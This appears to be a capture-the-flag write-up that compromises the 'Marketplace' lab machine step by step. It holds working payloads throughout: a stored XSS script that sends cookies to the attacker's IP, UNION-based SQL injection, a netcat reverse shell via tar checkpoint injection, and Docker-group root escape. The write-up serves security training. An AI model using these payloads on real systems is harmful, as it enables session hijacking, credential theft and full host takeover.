# Marketplace — CTF Write-Up

## Overview

This write-up documents the compromise of the **Marketplace** machine, starting with initial reconnaissance and ending with **root access**.

The machine was compromised by chaining several vulnerabilities together:

1. **Stored Cross-Site Scripting (XSS)**
2. **Administrator session hijacking**
3. **SQL Injection**
4. **Credential extraction**
5. **SSH access**
6. **Privilege escalation through a backup script**
7. **Docker group abuse**

The overall attack path was:

```text
Nmap Enumeration
        ↓
Web Application Enumeration
        ↓
Stored XSS
        ↓
Administrator Cookie Theft
        ↓
Administrator Access
        ↓
SQL Injection
        ↓
SSH Credentials
        ↓
SSH Access as jake
        ↓
Privilege Escalation to michael
        ↓
Docker Group Abuse
        ↓
Root Access
```
1. Reconnaissance
The first step was to perform an Nmap scan against the target to identify open ports and available services.

nmap -sC -sV <TARGET-IP>

The scan identified three open ports:

| Port | Service | Description |
| --- | --- | --- |
| `22` | SSH | Remote access |
| `80` | HTTP | Marketplace web application |
| `32768` | HTTP | Additional web service |

The two HTTP services were particularly interesting and required further enumeration.

<img width="695" height="311" alt="image" src="https://github.com/user-attachments/assets/6f7d85ca-449f-4a6f-ac51-f87d7fcc9748" />

2. Web Application Enumeration
Marketplace Application

Navigating to the HTTP service on port 80 revealed a marketplace-style web application.

The application allowed users to create accounts and interact with marketplace listings.

After creating an account, I discovered that authenticated users could create their own listings.

Screenshot

<img width="833" height="343" alt="image" src="https://github.com/user-attachments/assets/e173f883-2c3b-4b8b-aca1-5d8c4810dde8" />
<img width="827" height="660" alt="image" src="https://github.com/user-attachments/assets/bcba734f-d457-44b8-9667-125051dc2f42" />


Reporting Listings

When viewing a listing, there was an option to report the listing.

After reporting a listing, the application displayed:

"One of our admins will evaluate whether the listing you reported breaks our guidelines."

This was an important discovery because it indicated that an administrator would review user-controlled content.

This created a potential opportunity for a client-side attack such as Cross-Site Scripting (XSS).

The potential attack path was:
```text
Attacker creates malicious listing
              ↓
       Listing is reported
              ↓
   Administrator reviews it
              ↓
Administrator executes malicious content
```
3. Stored Cross-Site Scripting
Testing the Listing Title

Since users could control the contents of their listings, I tested the listing title for stored XSS.

The following payload was submitted:

<script>alert("Hello")</script>

After submitting the listing, a JavaScript alert appeared.

This confirmed that the listing title was vulnerable to stored Cross-Site Scripting.

<img width="1919" height="1000" alt="image" src="https://github.com/user-attachments/assets/d181476e-f776-4080-91f6-8af294652eb6" />

4. Session Cookie Theft

Once XSS had been confirmed, I tested whether the vulnerability could be used to access the user's session cookie.

I started a Python HTTP server on my attacking machine:

python -m http.server 4444

I then created another listing containing the following payload:

<script>
fetch('http://192.168.130.95:4444/steal?cookie=' + btoa(document.cookie));
</script>

The payload retrieves the browser's document.cookie value and sends it to the HTTP server running on my machine.

When the listing was accessed, the request appeared in the listener.

<img width="1117" height="109" alt="image" src="https://github.com/user-attachments/assets/b6cb694b-8538-49e0-af52-293c1c7fa551" />

At this point, I had confirmed that the XSS vulnerability could be used to exfiltrate session cookies.

However, the cookie belonged to my own account. The next objective was to obtain the administrator's cookie.

5. Administrator Session Hijacking

I returned to the reporting functionality discovered during enumeration.

The application had previously stated that an administrator would review reported listings.

I therefore reported the malicious listing and waited for it to be reviewed.

After a short period of time, a second request appeared in my HTTP server output.

This request contained a different session cookie.

<img width="1109" height="65" alt="image" src="https://github.com/user-attachments/assets/628f304d-60eb-42d7-898d-2f923c23673e" />

The different cookie indicated that another user had executed the XSS payload.

Since the application stated that an administrator would review reported listings, I suspected this was the administrator's session.

Replacing the Session Cookie

I used the browser's developer tools to replace my existing session cookie with the newly captured cookie.

After refreshing the page, an Administration Panel became available.

This confirmed that the captured cookie belonged to an administrator.

<img width="822" height="61" alt="image" src="https://github.com/user-attachments/assets/eb8cdd9e-eda5-44dd-be3c-eb1e121e79c4" />

6. Flag 1 — Administrator Access

The first flag was located within the Administration Panel.

7. SQL Injection

With administrator access established, I began investigating the functionality available through the Administration Panel.

The URL contained a user parameter:

/admin?user=0

This parameter appeared to interact with the backend database, so I tested it for SQL Injection.

I initially submitted:

' or 1=1

The application returned a database-related error.

Although the error did not provide useful information directly, it indicated that the supplied input was being processed by the application's SQL query.

This suggested that the parameter was potentially vulnerable to SQL Injection.

8. Determining the Number of Columns

To determine how many columns were returned by the underlying SQL query, I used a UNION SELECT statement.

I first tested three columns:

http://10.80.168.194/admin?user=0 UNION SELECT 1,2,3-- -

This returned an error.

I then increased the number of columns to four:

http://10.80.168.194/admin?user=0 UNION SELECT 1,2,3,4-- -

This request did not return an error.

This indicated that the original query contained four columns.

9. Database Enumeration

With the number of columns established, I could begin extracting information from the application's database.

I targeted the marketplace.messages table using the following payload:

/admin?user=0 UNION SELECT 1,
group_concat(
    id,
    ':',
    is_read,
    ':',
    message_content,
    ':',
    user_from,
    ':',
    user_to,
    '\n'
),
3,
4
FROM marketplace.messages-- -

The extracted data contained an automated system message which revealed an SSH password.

This provided a potential route from the compromised web application to the underlying operating system.

<img width="1914" height="536" alt="image" src="https://github.com/user-attachments/assets/bf2e979f-3024-4b53-ad03-c202e2eef5c3" />

10. SSH Access as jake

I attempted to use the recovered password with the username:

jake

The credentials were valid, allowing me to authenticate to the machine over SSH.

ssh jake@10.80.168.194
<img width="651" height="610" alt="image" src="https://github.com/user-attachments/assets/69791937-0010-468b-8d30-5368663978c3" />


At this point, the web application compromise had been converted into direct operating system access.

11. Flag 2 — User Flag

After gaining access as jake, I located the user flag.

<img width="305" height="36" alt="image" src="https://github.com/user-attachments/assets/79408cdd-5731-465b-8226-c333bd20815a" />

12. Privilege Escalation

With access as jake, the next objective was to determine whether the account had any elevated privileges.

I used:

sudo -l

The output showed that jake could execute:

/opt/backups/backup.sh

as the user:

michael
<img width="945" height="100" alt="image" src="https://github.com/user-attachments/assets/6c14adf9-ec3d-4da9-8097-a718f1ba222d" />


This provided a potential route to escalate from jake to another user.

13. Exploiting the Backup Script

After investigating several ways to manipulate the backup process, I referred to an existing walkthrough to understand the intended exploitation technique.

The method involved creating a reverse shell and using the backup process to execute it.

I first created the reverse-shell script:

echo "rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.95 4445 >/tmp/f" > shell.sh

I then created the files used to trigger execution:

echo ** > "--checkpoint-action=exec=sh shell.sh"
echo ** > --checkpoint=1

The required permissions were then applied:

chmod 777 shell.sh
chmod 777 backup.tar

Catching the Reverse Shell

I started a listener on my attacking machine.

I then executed the backup script as michael:

sudo -u michael /opt/backups/backup.sh

The listener successfully received a reverse shell.

I verified the current user using:

id

The output confirmed that the shell was running as:

michael
<img width="563" height="105" alt="image" src="https://github.com/user-attachments/assets/f38e6ec1-f93e-4bbd-bbb3-e3baa24cf2b4" />

14. Docker Group Privilege Escalation

The output from id revealed that michael was a member of the Docker group.

This was significant because membership of the Docker group can effectively provide root-level access to the underlying host.

I first enumerated the available Docker images:

docker images ls
<img width="778" height="147" alt="image" src="https://github.com/user-attachments/assets/76633155-9680-4cb6-be7c-c2eeb7f4fa62" />

15. Obtaining Root Access

I used Docker to mount the host's root filesystem inside a container:

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

The following part of the command mounts the host filesystem:

-v /:/mnt

This makes the host's entire filesystem available inside the container under /mnt.

The chroot command then changes the apparent root directory to the mounted host filesystem.

This resulted in a shell with root-level access to the host.

<img width="962" height="80" alt="image" src="https://github.com/user-attachments/assets/657cd382-283e-4fca-801c-b14418c8cfdb" />

16. Flag 3 — Root Flag

With root access established, I navigated to the root user's files and retrieved the final flag.

<img width="305" height="55" alt="image" src="https://github.com/user-attachments/assets/03fc16bb-c64e-48aa-8657-c7ff5dbf34b1" />
